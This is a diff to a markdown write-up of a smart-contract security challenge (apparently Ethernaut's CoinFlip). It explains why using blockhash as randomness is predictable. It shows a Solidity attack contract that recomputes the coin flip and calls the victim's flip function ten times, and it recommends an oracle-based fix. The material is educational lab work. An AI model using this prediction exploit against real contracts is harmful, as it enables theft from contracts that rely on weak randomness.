@@ -6,10 +6,20 @@
 This smart contract has a vulnerability, because:
 ```
 
-- TODO
+- The player can use every variable that the victim contract uses to guess the correct side each time,
+  - because everything on the blockchain is currently public and visible, so anyone can find these exact values the victim contract uses.
+  - ⚠️ Using blockhash as a source of randomness is basicly leaving your keys in full view, out in public, for anyone to find and use.  
 
 ```Solidity
-
+uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+function flip() public returns(bool) {
+      
+uint256 blockValue = uint256(blockhash(block.number -1)); // <----- NOT random at all! 
+       
+uint256 coinFlip = uint256(blockValue/FACTOR);
+      
+bool side = coinFlip == 1 ? true : false;
 ```
 
 ## 🆘 The victim contract in detail
@@ -39,57 +49,6 @@ The vulnerability:
 
 ```Solidity
 
-```
-
-## 💥 The attack in detail
-
-```yml
-The attack:
-```
-
-- TODO
-
-```JavaScript
-
-```
-- TODO
-
-```Solidity
-
-```
-
-## 🩺 How can we fix this vulnerablity in the victim contract?
-
-- TODO
-
-```Solidity
-
-```
-
-```yml
-This smart contract has a vulnerability, it's use of the public source of randomness makes it vulnerable because:
-```
-- the ethereum blockchain is fully transparent and everything is public and can be viewed,
-
-```Solidity
-/**  
-* @notice Blockhash and block.number are globally accessible variables available to everyone, 
-* this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip.
-* The best practice in this case would be to introduce a source of randomness into a contract with a 
-* decentralized oracle to compute random numbers, because there is no native way to generate random numbers in 
-* Solidity and everything is publicly visible in the contract.
-*/
-/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
-function flip(bool _guess) public returns (bool) {
-  uint256 blockValue = uint256(blockhash(block.number.sub(1))); 
-  uint256 coinFlip = blockValue.div(FACTOR); 
-  bool side = coinFlip == 1 ? true : false;
-```
-  - after the attack contract finds the value for the flip it is assigned to the call to the flip function of the victim contract,
-    - the player calls this flip function 10 times in a row to win.
-
-```Solidity
-victimContract.flip(side);
 ```
 
 ## 💥 The attack contract in detail:
@@ -136,9 +95,9 @@ contract CoinFlipAttack {
         victimContract = CoinFlip(_victimContractAddr);
     }
 ```
-- finally the attack begins,
-- after the attack contract finds the value for the flip it is assigned to the call to the flip function of the victim contract,
-    - the player calls this flip function 10 times in a row to win.
+
+```yml
+```
 
 ```Solidity
 
@@ -162,6 +121,33 @@ function flip() public returns(bool) {
 }
 
 ```
+
+## 💥 The attack in detail
+
+```yml
+The attack:
+```
+
+- Everything from the victim contract is just copied and pasted into our attack contract's flip function,
+
+```Solidity
+/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
+function flip() public returns(bool) {
+  uint256 blockValue = uint256(blockhash(block.number.sub(1))); // <----- NOT random at all!
+  
+  uint256 coinFlip = blockValue.div(FACTOR); // <-----  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        
+  bool side = coinFlip == 1 ? true : false; // <----- player's coinFlip will always equal true!
+
+  victimContract.flip(side); // <----- attack contract interacts with victim contract calling it's flip function passing our always true side.
+    }
+```
+
+- finally the attack begins,
+- after the attack contract finds the value for the flip it is assigned to the call, victim contract's flip function,
+    - the player calls this flip function 10 times in a row to win.
+
+
 ## 💥 The attack contract locked and loaded in REMIX IDE
 
 ```yml
@@ -172,6 +158,17 @@ Fire away at that flip button, ten times:
 <p align="left" >
 <img width="506" height="512" src="https://user-images.githubusercontent.com/104662990/199078205-0c19814b-c867-46bf-8b1e-9404585037af.png">
 </P>
+
+## 🩺 How can we fix this vulnerablity in the victim contract?
+
+- Use a decentralized oracle network for the source of randomness.
+
+```Solidity
+
+```
+
+
+
 
 
 
